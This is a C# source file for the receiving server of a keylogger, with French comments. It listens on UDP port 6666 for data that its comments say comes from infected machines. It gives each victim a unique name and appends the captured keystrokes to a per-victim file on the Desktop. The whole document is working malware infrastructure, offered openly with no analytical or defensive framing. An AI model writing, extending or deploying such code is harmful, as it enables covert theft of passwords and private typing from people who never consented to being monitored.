using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Threading.Tasks;

namespace Serveur_keylogger
{
    internal class Program
    {
        static string Save_user = @"C:\Users\" + Environment.UserName +@"\Desktop\myUser.txt"; // fichier de sauvegarde des utilisateurs
        static string Save_file_kl = @"C:\Users\" + Environment.UserName + @"\Desktop\file_kl\"; // emplacement des fichiers
        public static void Check_if_need_create_db()
        {
            if (!File.Exists(Save_user))
            {
                StreamWriter sw = new StreamWriter(Save_user, false);
            }

        }

        static int getLenght_byte(byte[] b)
        {
            int a = 0;
            foreach (byte elem in b)
            {
                a++;
            }
            return a;
        }

        public static string Cut_head_data(string s)
        {
            //Split la chaine de caractère
            string[] sub_s = s.Split(';'); 
            

            //Si c'est une demande de création

            if (sub_s[0] == "creation utilisateur svp")
            {
                string name = sub_s[1]; //dans ce cas - 0 = en-tete | 1 = message
                bool not_in_list = false; // variable qui permet de refaire la lecture des utilisateurs pour etre sur de ne pas avoir de doublon
                
                // On verifie si on a deja ce nom d'utilisateur 
                while (!not_in_list)
                {
                    not_in_list = true;
                    using (StreamReader sr = new StreamReader(Save_user))
                    {
                        string l;
                        int add_to_name = 1;
                        while ((l = sr.ReadLine()) != null)
                        {
                            if (l == name)
                            {
                                not_in_list = false;
                                name = name + "_" + add_to_name.ToString();
                                add_to_name++;
                            }
                        }
                        sr.Close();
                    }
                }
                // on ajoute l'utilisateur
                File.AppendAllText(Save_user, name + "\r\n");

                // On crée le fichier
                File.Create(Save_file_kl+"\\" + sub_s[1] + ".txt");

                // On retourne un chaine de caractère avec le nom pour le renvoyer au client
                return name;

            }

            //Sinon on cherche le bon fichier avec l'en-tete
            else
            {
                Console.WriteLine("ca rentre ici");
                string arbo = Save_file_kl + sub_s[0] + ".txt";
                if (!File.Exists(arbo))
                {
                    File.Create(arbo);
                }
                //On écrit dans le fichier
                File.AppendAllText(arbo, sub_s[1]);
                return "";
            }
                
        }

        static void Main(string[] args)
        {
            Check_if_need_create_db();
            UdpClient serveur = new UdpClient(6666);

            while (true) // le but est d'attendre les messages envoyés par les machines infectées
            {
                IPEndPoint serv_ip = new IPEndPoint(IPAddress.Any, 6666);
                byte[] buffer = serveur.Receive(ref serv_ip); // On attend les données
                string S_buffer = Encoding.Default.GetString(buffer);
                string answer = Cut_head_data(S_buffer);
                Console.WriteLine(answer);
                if(answer != "")
                {
                    serveur.Send(Encoding.ASCII.GetBytes(answer), getLenght_byte(Encoding.ASCII.GetBytes(answer)),serv_ip);
                }
               
            }
        }
    }
}
